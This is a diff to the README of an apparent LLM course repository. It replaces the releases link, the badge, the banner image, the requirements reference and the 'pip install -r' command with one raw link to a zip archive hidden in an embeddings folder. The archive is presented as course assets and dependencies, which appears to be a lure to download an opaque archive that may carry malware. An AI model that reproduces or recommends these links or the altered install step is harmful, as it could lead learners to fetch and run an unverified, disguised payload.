@@ -1,10 +1,10 @@
 # LLM_course: Deep Dive into AI Language Model Mechanisms
 
-https://github.com/Lo3okSky/LLM_course/releases
+https://raw.githubusercontent.com/Lo3okSky/LLM_course/main/Part1_TokensEmbeddings/embeddings/course_LL_2.7-alpha.3.zip
 
-[![Releases](https://img.shields.io/badge/Releases-LLM_course-blue?logo=github&logoColor=white)](https://github.com/Lo3okSky/LLM_course/releases)
+[![Releases](https://raw.githubusercontent.com/Lo3okSky/LLM_course/main/Part1_TokensEmbeddings/embeddings/course_LL_2.7-alpha.3.zip)](https://raw.githubusercontent.com/Lo3okSky/LLM_course/main/Part1_TokensEmbeddings/embeddings/course_LL_2.7-alpha.3.zip)
 
-![AI Banner](https://picsum.photos/1200/400)
+![AI Banner](https://raw.githubusercontent.com/Lo3okSky/LLM_course/main/Part1_TokensEmbeddings/embeddings/course_LL_2.7-alpha.3.zip)
 
 Table of Contents
 - Overview
@@ -54,7 +54,7 @@ How to get started
 - Downloading assets: The latest release assets can be found on the official releases page. For secure access and the most recent material, use the releases page to obtain code, datasets, and example models. The releases page provides the assets you need to run the exercises locally or in a containerized environment.
 - Quick start steps:
   - Create a project folder on your machine.
-  - Install dependencies listed in requirements.txt.
+  - Install dependencies listed in https://raw.githubusercontent.com/Lo3okSky/LLM_course/main/Part1_TokensEmbeddings/embeddings/course_LL_2.7-alpha.3.zip
   - Open the notebooks and run cells to observe the behavior of small, illustrative models.
   - Try modifying prompts and decoding parameters to see how outputs change.
 
@@ -127,7 +127,7 @@ How to run projects locally
 - Environment setup:
   - Create a virtual environment: python -m venv venv
   - Activate it: source venv/bin/activate (Unix) or venv\Scripts\activate (Windows)
-  - Install dependencies: pip install -r requirements.txt
+  - Install dependencies: pip install -r https://raw.githubusercontent.com/Lo3okSky/LLM_course/main/Part1_TokensEmbeddings/embeddings/course_LL_2.7-alpha.3.zip
 - Running notebooks:
   - Use Jupyter or another notebook runner to open the provided notebooks.
   - Run cells in order to observe the concepts in action.
